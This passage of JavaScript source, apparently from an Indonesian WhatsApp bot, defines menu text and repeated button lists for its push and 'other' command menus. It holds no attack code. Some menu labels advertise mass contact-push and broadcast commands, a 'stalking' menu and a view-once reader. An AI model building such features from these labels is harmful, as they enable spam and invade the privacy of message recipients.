│⦿ 〔 _.jpm2_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'pushmenubutton': {
let teks =`◤─「 \`PUSH MENU\` 」─✦
│⦿ 〔 _.cekidgc_
│⦿ 〔 _.pushkontak_
│⦿ 〔 _.pushkontakv2_
│⦿ 〔 _.pushkontakv3_
│⦿ 〔 _.pushkontakv4_
│⦿ 〔 _.savekontakv_
│⦿ 〔 _.savekontakv2_
│⦿ 〔 _.getkontak_
│⦿ 〔 _.sendkontak_
│⦿ 〔 _.jpm_
│⦿ 〔 _.jpm2_
│⦿ 〔_.startjpmslide_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'othermenubutton': {
let teks =`◤─「 \`OTHER MENU\` 」─✦
│⦿ 〔 _.ping_
│⦿ 〔 _.brat_
│⦿ 〔 _.ceksewa_
│⦿ 〔 _.listsewa_
│⦿ 〔 _.readviewonce_
│⦿ 〔 _.cekkhodam_
│⦿ 〔 _.paptt_
│⦿ 〔 _.alkitab_
│⦿ 〔 _.totalfitur_
│⦿ 〔 _.menu_
│⦿ 〔 _.myip_
│⦿ 〔 _.reportbug_
│⦿ 〔 _.listpem_
│⦿ 〔 _.liststicker_
│⦿ 〔 _.listimage_
│⦿ 〔 _.listvideo_
│⦿ 〔 _.listvn_
│⦿ 〔 _.listbadword_
│⦿ 〔 _.listpc_
│⦿ 〔 _.listgc_
│⦿ 〔 _.owner_
│⦿ 〔 _.jadibot_
│⦿ 〔 _.listjadibot_
│⦿ 〔 _.donate_
│⦿ 〔 _.friend_
│⦿ 〔 _.obfuscate_
│⦿ 〔 _.styletext_
│⦿ 〔 _.fliptext_
│⦿ 〔 _.tts_
│⦿ 〔 _.say_
│⦿ 〔 _.togif_
│⦿ 〔 _.toqr_
│⦿ 〔 _.bass_
│⦿ 〔 _.blown_
│⦿ 〔 _.deep_
│⦿ 〔 _.earrape_
│⦿ 〔 _.fast_
│⦿ 〔 _.fat_
│⦿ 〔 _.nightcore_
│⦿ 〔 _.reverse_
│⦿ 〔 _.robot_
│⦿ 〔 _.slow_
│⦿ 〔 _.smooth_
│⦿ 〔 _.squirrel_
│⦿ 〔 _.tinyurl_
│⦿ 〔 _.tinyurl__
│⦿ 〔 _.tovn___
│⦿ 〔 _.toaudio_
│⦿ 〔 _.tomp3__
│⦿ 〔 _.tomp4_
│⦿ 〔 _.toimg_
│⦿ 〔 _.toonce_
│⦿ 〔 _.sticker_
│⦿ 〔 _.take_
│⦿ 〔 _.emoji_
│⦿ 〔 _.volume_
│⦿ 〔 _.ebinary_
│⦿ 〔 _.dbinary_
│⦿ 〔 _.ssweb_
│⦿ 〔 _.quoted_
│⦿ 〔 _.runtime_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
